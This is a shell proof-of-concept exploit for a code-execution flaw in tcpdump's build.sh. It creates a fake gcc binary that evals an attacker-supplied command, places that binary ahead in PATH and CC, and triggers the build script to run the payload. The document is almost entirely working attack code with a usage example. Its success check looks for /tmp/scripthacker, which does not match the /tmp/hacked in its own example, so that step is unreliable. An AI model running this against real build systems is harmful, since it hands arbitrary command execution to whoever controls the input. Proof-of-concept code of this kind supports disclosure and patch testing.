#!/bin/sh
# PoC for tcpdump build.sh CODE EXEC vulnerability
# Usage: ./poc.sh "<malicious_command>" <fake_gcc_path> <build_sh_path>
# Author : Ahmed Ben Abdelmoemen
if [ $# -lt 3 ]; then
    echo "Usage: $0 '<malicious_command>' <fake_gcc_path> <build_sh_path>"
    echo "Example: $0 'id > /tmp/hacked' /tmp/fake-gcc ./build.sh"
    exit 1
fi

MALICIOUS_CMD="$1"
FAKE_GCC="$2"
BUILD_SH="$3"

echo "[+] Setting up malicious environment..."
# Create fake GCC binary with attacker's command
cat > "$FAKE_GCC" <<EOF
#!/bin/sh
echo "gcc (GCC) 12.2.0; \$(eval $MALICIOUS_CMD)"  # Execute payload
EOF
chmod +x "$FAKE_GCC"

# Check if build.sh exists and is executable
if [ ! -f "$BUILD_SH" ]; then
    echo "[!] Error: $BUILD_SH does not exist."
    exit 1
elif [ ! -x "$BUILD_SH" ]; then
    echo "[!] Error: $BUILD_SH is not executable."
    exit 1
fi

# Inject fake GCC into PATH
export PATH="$(dirname "$FAKE_GCC"):$PATH"
export CC="$FAKE_GCC"

echo "[+] Triggering vulnerable build script ($BUILD_SH)..."
cd "$(dirname "$BUILD_SH")" && ./"$(basename "$BUILD_SH")"

# Verify exploitation
if [ -f /tmp/scripthacker ]; then
    echo "[!] EXPLOIT SUCCESSFUL: Payload executed."
    echo -n "Proof: "
    cat /tmp/scripthacker
else
    echo "[!] Exploit failed (build.sh may not be vulnerable)."
fi
